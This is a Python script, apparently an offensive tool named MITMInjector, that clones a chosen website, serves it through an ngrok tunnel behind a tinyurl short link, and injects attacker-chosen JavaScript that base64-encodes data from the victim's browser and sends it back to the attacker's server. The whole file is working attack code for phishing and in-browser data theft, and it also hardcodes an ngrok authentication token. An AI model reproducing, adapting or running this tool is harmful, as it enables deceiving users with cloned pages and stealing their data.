#!/usr/bin/python3

from bs4 import BeautifulSoup	
import os, subprocess
from urllib.request import urlopen
from http.server import BaseHTTPRequestHandler, HTTPServer
from multiprocessing import Process
from functools import partial
import base64
import argparse

from core.ngrok import ngrok

class injectionHandler(BaseHTTPRequestHandler):
	payload = ""
	url = ""
	def __init__(self, payload, url, *args, **kwargs):
		self.payload = payload
		self.url = url
		super().__init__(*args, **kwargs)

	def inject(self,content):

		payloadFunctions = """
		function sendPayload(payload){
			var xhr = new XMLHttpRequest(); 
			payload = btoa(payload);
			xhr.open('GET', '/payload/' + payload , true);
			xhr.send();

		}
		"""
		payload = open("payloads/" + self.payload + ".js",'r').read()

		html = BeautifulSoup(content,features="html.parser")
		if html.body:
			script = html.new_tag(
				"script",				
				type='application/javascript')
			script.string=payloadFunctions + payload
			html.body.insert(0, script)
			return str(html).encode()

	def end_headers (self):
		self.send_header('Access-Control-Allow-Origin', '*')
		BaseHTTPRequestHandler.end_headers(self)

	def do_GET(self):
		if self.path.startswith("/payload/"):
			encPayload = str(self.path.split('/')[2])
			decPayload = str(base64.b64decode(encPayload), "utf-8")
			print ("RECEIVED PAYLOAD: " + decPayload)
			self.send_response(200)
			return
		self.send_response(200)		
		self.send_header('Content-type','text/html')
		self.end_headers()
		self.wfile.write(self.inject(urlopen(self.url).read()))
		return
		
	def log_message(self, format, *args):
		return

def urlShortener(nurl):
	url = 'http://tinyurl.com/api-create.php?url=' + nurl
	r = urlopen(url).read() 
	return str(r.decode())

def startServer(url, port, payload):
	try:
		#Create a web server and define the handler to manage the incoming request
		handler = partial(injectionHandler,payload, url)
		server = HTTPServer(('', port), handler)
		print ('Started httpserver on port ' , port)

		server.serve_forever()

	except KeyboardInterrupt:
		print ('^C received, shutting down the web server')
		server.socket.close()

def main(args):
	#start ngrok
	lngrok = ngrok("yQaP2tUKuENSB2YttNqX_5KqoHDiGDbHzGAUDUXePj", str(args["port"]))
	NgrokURL = lngrok.start()

	print ("Public URL: " + NgrokURL)
	print ("Short URL: " + urlShortener(NgrokURL))

	startServer(args["url"], args["port"], args["payload"])

if __name__ == '__main__':
	version = "1.1.0"
	print("""
 __  __ ___ _____ __  __ ___        _           _             
|  \/  |_ _|_   _|  \/  |_ _|_ __  (_) ___  ___| |_ ___  _ __ 
| |\/| || |  | | | |\/| || || '_ \ | |/ _ \/ __| __/ _ \| '__|
| |  | || |  | | | |  | || || | | || |  __/ (__| || (_) | |   
|_|  |_|___| |_| |_|  |_|___|_| |_|/ |\___|\___|\__\___/|_|   
                                 |__/     

	Andrea Fortuna - andrea@andreafortuna.org - https://www.andreafortuna.org
	""")

	args = argparse.ArgumentParser()
	args.add_argument("-u", "--url", required=True, help="Website to clone")
	args.add_argument("-p", "--port", required=False, help="Local server port (default:8080)", default=8080)
	args.add_argument("-P", "--payload", required=True, help="Payload")

	args = vars(args.parse_args())
	main(args)











